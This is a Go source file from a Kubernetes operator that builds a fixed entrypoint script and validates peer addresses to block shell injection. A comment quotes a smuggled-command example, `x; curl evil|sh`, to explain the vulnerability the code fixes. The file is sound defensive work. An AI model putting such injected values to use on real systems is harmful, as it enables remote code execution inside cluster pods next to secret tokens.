/*
Copyright 2026 OramaSearch.
Licensed under the Apache License, Version 2.0.
*/

package controller

import (
	"fmt"

	"github.com/go-logr/logr"
	"net"
	"regexp"
	"sort"
	"strconv"
	"strings"

	"k8s.io/apimachinery/pkg/api/meta"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"

	oramav1alpha1 "github.com/oramasearch/orama-operator/api/v1alpha1"
)

// Zetta peer addresses and the node entrypoint (operator#279).
//
// Peer addresses come from two places the operator does not fully trust: spec.externalPeers (anyone who can
// write the CR) and orama_control.topology (anyone who can append a row to the shared Zetta store, which
// spans every k8s cluster that shares the Zetta cluster). They used to be joined into the `/bin/sh -c`
// entrypoint text, so a peer such as `x; curl evil|sh` ran inside every Zetta pod, next to
// ZETTA_ADMIN_TOKEN and ZETTA_CLUSTER_TOKEN. Two independent defences now hold:
//
//  1. The entrypoint script is a CONSTANT (zettaEntrypointScript). Nothing from a CR, Postgres or Zetta is
//     ever formatted into it. Peers and the node flags reach it as container args (positional parameters),
//     the seed as an env var, and the script only moves them with "$@" / "$1" / quoted expansions — the
//     shell never parses them as code, never splits them and never globs them.
//  2. Every peer is validated as host:port (a DNS name, an IPv4 address or a bracketed IPv6 address, and a
//     port from 1 to 65535): by the CRD pattern on spec.externalPeers items, and here for topology rows and
//     for CRs written before that pattern existed. An invalid spec.externalPeers (or spec.wanAddress) is
//     refused with the PeerAddressesValid condition and the StatefulSet is left as it was; an invalid
//     topology peer is dropped and named in the same condition while the rest of the cluster reconciles.

// peerAddressesConditionType reports whether the slice's peer addresses passed validation.
const peerAddressesConditionType = "PeerAddressesValid"

// zettaSeedEnv carries node-0's peer address (the in-cluster rendezvous) into the entrypoint. It is NOT a
// name the engine reads (the engine's own provisioning env is ZETTA_SEED_PEER, which would add a second,
// unvalidated peer path), so only the entrypoint script sees it.
const zettaSeedEnv = "ORAMA_ZETTA_SEED"

// zettaArgsSeparator splits the entrypoint's positional parameters: the node flags come before it, the
// external peers (one bare host:port per parameter) after it.
const zettaArgsSeparator = "--"

// zettaEntrypointName is $0 for the entrypoint script (`sh -c <script> <name> <args...>`).
const zettaEntrypointName = "zetta-entrypoint"

// zettaEntrypointScript is the node entrypoint. It is the same text for every OramaZettaCluster; only Go
// constants are formatted into it. It needs a shell because the per-node values are known only at run time:
// the ordinal (from POD_NAME), the host IP under hostNetwork, and this node's field of ZETTA_ADVERTISE_MAP.
//
// Positional parameters (container args): the node flags, then "--", then the external peers. The script
// rebuilds the argv in place with `set -- "$@" ...` — the POSIX way to grow an argument list without
// re-parsing it — so the final `exec zetta "$@"` passes every value through as one argv element. The order
// of the result is exactly what the earlier string-built entrypoint produced:
//
//	--headless --data-dir /data --listen 0.0.0.0:<peer> --mcp-listen 0.0.0.0:<api> <node flags>
//	[--peer <seed> (ordinal != 0)] [--peer <external peer>]... [--advertise <this node's addr>]
//
// The earlier entrypoint also appended `--admin-token <token>`. That put the token in the process's argv,
// which every process on the node can read; the engine reads ZETTA_ADMIN_TOKEN from its environment when the
// flag is absent, so the flag is gone (operator#279).
var zettaEntrypointScript = fmt.Sprintf(`set -eu
ORD="${POD_NAME##*-}"   # NOT $HOSTNAME — under hostNetwork that is the node's name, not the pod's
PEER_PORT=%[2]d
API_PORT=%[3]d
SEED="${%[4]s}"
if [ "${ZETTA_HOST_NETWORK:-0}" = "1" ] && [ "$ORD" != "0" ]; then
  # hostNetwork packs peers onto the shared host(s): every ordinal binds host ports, so give each its
  # own (node-n → 7777+n / 4800+n) and seed off node-0 at the HOST's real IP (HOST_IP, not 127.0.0.1).
  # The seed address must equal what node-0 advertises (its non-loopback IP) or Zetta's address-keyed
  # reconnect dedup never matches and leaks duplicate links (oramasearch/zetta#739).
  PEER_PORT=$((%[2]d + ORD))
  API_PORT=$((%[3]d + ORD))
  SEED="${HOST_IP}:%[2]d"
fi
# The container args arrive as "$@": the node flags, a "--" separator, then the external peers, one
# host:port per parameter (operator#279). They are only ever moved with "$1"/"$@", never re-parsed: the
# original parameters are rotated to the END of the list behind the base flags, one at a time.
N=$#
set -- "$@" --headless --data-dir %[1]s --listen "0.0.0.0:$PEER_PORT" --mcp-listen "0.0.0.0:$API_PORT"
PEERS=0
while [ "$N" -gt 0 ]; do
  ARG=$1
  shift
  N=$((N - 1))
  if [ "$PEERS" = "1" ]; then
    set -- "$@" --peer "$ARG"
  elif [ "$ARG" = "%[5]s" ]; then
    PEERS=1
    if [ "$ORD" != "0" ]; then set -- "$@" --peer "$SEED"; fi
  else
    set -- "$@" "$ARG"
  fi
done
# Per-node WAN advertise (operator#104, oramasearch/zetta#739): ZETTA_ADVERTISE_MAP is a positional
# comma-joined map — field (ORD+1) is THIS node's own routable addr; a 1-field map applies to all nodes.
# A permanent wan node gossips ITS OWN reachable address, so cross-cluster peers spread across all of them.
ADV="${ZETTA_ADVERTISE_MAP:-}"
if [ -n "$ADV" ]; then
  FIELDS=$(printf '%%s\n' "$ADV" | awk -F, '{print NF}')
  if [ "$FIELDS" = "1" ]; then MINE="$ADV"; else MINE=$(printf '%%s\n' "$ADV" | cut -d, -f$((ORD+1))); fi
  if [ -n "$MINE" ]; then set -- "$@" --advertise "$MINE"; fi
fi
# The admin token is NOT a flag: argv is world-readable (/proc/<pid>/cmdline), so the engine reads it from
# ZETTA_ADMIN_TOKEN in its environment (operator#279).
printf 'zetta node %%s (ordinal %%s): zetta %%s%%s%%s\n' "$POD_NAME" "$ORD" "$*" \
  "${ZETTA_CLUSTER_TOKEN:+ [join-token via env ****]}" "${ZETTA_ADMIN_TOKEN:+ [admin-token via env ****]}"
exec zetta "$@"`, zettaDataDir, zettaPeerPort, zettaAPIPort, zettaSeedEnv, zettaArgsSeparator)

// zettaNodeFlags are the per-slice engine flags (zetta#803/#810): --node-type from spec.ephemeral, and
// --dial-out-only iff the slice's effective reachability is dial-out-only. Constants only.
func zettaNodeFlags(z *oramav1alpha1.OramaZettaCluster) []string {
	flags := []string{"--node-type", "permanent"}
	if z.Spec.Ephemeral {
		flags = []string{"--node-type", "ephemeral"}
	}
	if zettaReachability(z) == oramav1alpha1.ReachabilityDialOutOnly {
		flags = append(flags, "--dial-out-only")
	}
	return flags
}

// zettaEntrypointArgs renders the container args the entrypoint script reads as "$@": $0, the node flags,
// the separator, then the external peers. Peers that fail validation are dropped here too — the callers
// already validated them, so this is only the last line of defence and never changes a valid set.
func zettaEntrypointArgs(z *oramav1alpha1.OramaZettaCluster, peers []string) []string {
	args := append([]string{zettaEntrypointName}, zettaNodeFlags(z)...)
	args = append(args, zettaArgsSeparator)
	for _, p := range peers {
		if validateZettaPeerAddress(p) == nil {
			args = append(args, p)
		}
	}
	return args
}

var peerDNSLabel = `[A-Za-z0-9]([A-Za-z0-9-]{0,61}[A-Za-z0-9])?`

// peerHostnameRE is a DNS name (RFC 1123 labels, letters of either case) or a dotted IPv4 address, which the
// same grammar admits. It is the host half of the CRD pattern on spec.externalPeers items.
var peerHostnameRE = regexp.MustCompile(`^` + peerDNSLabel + `(\.` + peerDNSLabel + `)*$`)

// The error never contains the value itself (callers quote it with quoteForStatus), so a hostile value
// cannot put raw bytes such as newlines into a log line or a condition message.
//
// validateZettaPeerAddress accepts exactly `host:port`: host is a DNS name, an IPv4 address or a bracketed
// IPv6 address (no zone), port is decimal 1-65535. Everything else — spaces, quotes, shell metacharacters,
// newlines, an empty host, a missing port — is refused.
func validateZettaPeerAddress(addr string) error {
	if addr == "" {
		return fmt.Errorf("empty address")
	}
	if len(addr) > 261 { // 253-byte DNS name + ":" + 5-digit port, or a bracketed IPv6 literal
		return fmt.Errorf("address longer than 261 bytes")
	}
	host, port, err := net.SplitHostPort(addr)
	if err != nil {
		return fmt.Errorf("not host:port")
	}
	if !isDecimalPort(port) {
		return fmt.Errorf("port is not a number from 1 to 65535")
	}
	if strings.HasPrefix(addr, "[") {
		ip := net.ParseIP(host)
		if ip == nil || ip.To4() != nil || strings.Contains(host, ".") {
			return fmt.Errorf("bracketed host is not an IPv6 address")
		}
		return nil
	}
	if strings.Contains(host, ":") {
		return fmt.Errorf("an IPv6 host must be bracketed")
	}
	if len(host) > 253 || !peerHostnameRE.MatchString(host) {
		return fmt.Errorf("host is not a DNS name or IP address")
	}
	return nil
}

func isDecimalPort(port string) bool {
	if port == "" || len(port) > 5 {
		return false
	}
	for _, c := range port {
		if c < '0' || c > '9' {
			return false
		}
	}
	n, err := strconv.Atoi(port)
	return err == nil && n >= 1 && n <= 65535 && port[0] != '0'
}

// validateZettaWANAddress checks spec.wanAddress (`host` or `host:port`; the peer port is assumed when the
// port is absent) by validating the address the operator would advertise.
func validateZettaWANAddress(addr string) error {
	return validateZettaPeerAddress(withPeerPort(addr))
}

// invalidSpecPeerAddresses lists the spec fields carrying a peer address that fails validation, as
// human-readable `field: value (reason)` entries. Empty means the spec is acceptable.
func invalidSpecPeerAddresses(z *oramav1alpha1.OramaZettaCluster) []string {
	var out []string
	for i, p := range z.Spec.ExternalPeers {
		p = strings.TrimSpace(p)
		if p == "" {
			continue // blanks were always skipped (zettaPeerSet)
		}
		if err := validateZettaPeerAddress(p); err != nil {
			out = append(out, fmt.Sprintf("spec.externalPeers[%d] %s: %v", i, quoteForStatus(p), err))
		}
	}
	if a := strings.TrimSpace(z.Spec.WanAddress); a != "" {
		if err := validateZettaWANAddress(a); err != nil {
			out = append(out, fmt.Sprintf("spec.wanAddress %s: %v", quoteForStatus(a), err))
		}
	}
	return out
}

// splitValidPeers keeps the valid peer addresses in order and returns the invalid ones separately.
func splitValidPeers(peers []string) (valid, dropped []string) {
	for _, p := range peers {
		if validateZettaPeerAddress(p) == nil {
			valid = append(valid, p)
		} else {
			dropped = append(dropped, p)
		}
	}
	return valid, dropped
}

// quoteForStatus renders an untrusted value for a log line or condition message: Go-quoted (so newlines and
// control bytes stay visible and inert) and truncated.
func quoteForStatus(s string) string {
	const max = 80
	if len(s) > max {
		s = s[:max] + "..."
	}
	return strconv.Quote(s)
}

// peerAddressesCondition builds the PeerAddressesValid condition. specInvalid refuses the spec (the
// StatefulSet is not updated); droppedTopology names topology peers that were dropped while the cluster
// reconciled normally. The message is deterministic (sorted, bounded) so a steady state writes no status.
func peerAddressesCondition(specInvalid, droppedTopology []string) metav1.Condition {
	if len(specInvalid) > 0 {
		return metav1.Condition{
			Type: peerAddressesConditionType, Status: metav1.ConditionFalse, Reason: "InvalidSpecPeerAddress",
			Message: "refused, the StatefulSet is left unchanged until the spec is fixed — every peer must be " +
				"host:port (DNS name, IPv4 or [IPv6], port 1-65535): " + boundedList(specInvalid),
		}
	}
	if len(droppedTopology) > 0 {
		quoted := make([]string, 0, len(droppedTopology))
		for _, p := range droppedTopology {
			quoted = append(quoted, quoteForStatus(p))
		}
		sort.Strings(quoted)
		return metav1.Condition{
			Type: peerAddressesConditionType, Status: metav1.ConditionFalse, Reason: "InvalidTopologyPeerDropped",
			Message: "dropped invalid peer addresses read from orama_control.topology (the remaining peers are " +
				"in use): " + boundedList(quoted),
		}
	}
	return metav1.Condition{
		Type: peerAddressesConditionType, Status: metav1.ConditionTrue, Reason: "Valid",
		Message: "every peer address is a valid host:port",
	}
}

func boundedList(items []string) string {
	const max = 10
	if len(items) <= max {
		return strings.Join(items, "; ")
	}
	return strings.Join(items[:max], "; ") + fmt.Sprintf("; and %d more", len(items)-max)
}

// peerAddressesConditionFor decides the condition for this round. When the topology was read (or the
// datastore symbiosis is off) the condition reflects this round fully. When the read failed the topology
// half is unknown: the current condition is kept, so a flaky read does not flap it — except a stale
// InvalidSpecPeerAddress, which is cleared once the spec is valid again (nil = leave as is).
func peerAddressesConditionFor(z *oramav1alpha1.OramaZettaCluster, specInvalid, droppedTopology []string, topologyRead bool) *metav1.Condition {
	if len(specInvalid) > 0 || topologyRead {
		c := peerAddressesCondition(specInvalid, droppedTopology)
		return &c
	}
	if cur := meta.FindStatusCondition(z.Status.Conditions, peerAddressesConditionType); cur != nil && cur.Reason == "InvalidSpecPeerAddress" {
		c := peerAddressesCondition(nil, nil)
		return &c
	}
	return nil
}

// setPeerAddressesCondition applies cond (nil = leave the current condition as it is, used when the
// topology could not be read this round) and reports whether the status changed.
func setPeerAddressesCondition(z *oramav1alpha1.OramaZettaCluster, cond *metav1.Condition) bool {
	if cond == nil {
		return false
	}
	cond.ObservedGeneration = z.Generation
	return meta.SetStatusCondition(&z.Status.Conditions, *cond)
}

// noteDroppedTopologyPeers logs the topology peers dropped for one cluster, once per change of the dropped
// set, so a steady hostile row does not produce a log line every reconcile.
func (r *OramaZettaClusterReconciler) noteDroppedTopologyPeers(log logr.Logger, key, cluster string, dropped []string) {
	quoted := make([]string, 0, len(dropped))
	for _, p := range dropped {
		quoted = append(quoted, quoteForStatus(p))
	}
	sort.Strings(quoted)
	fingerprint := strings.Join(quoted, "\n")
	if prev, ok := r.droppedPeersLog.Load(key); ok && prev.(string) == fingerprint {
		return
	}
	r.droppedPeersLog.Store(key, fingerprint)
	if len(dropped) > 0 {
		log.Info("dropped invalid peer addresses read from the cross-cluster topology", "cluster", cluster, "dropped", quoted)
	}
}
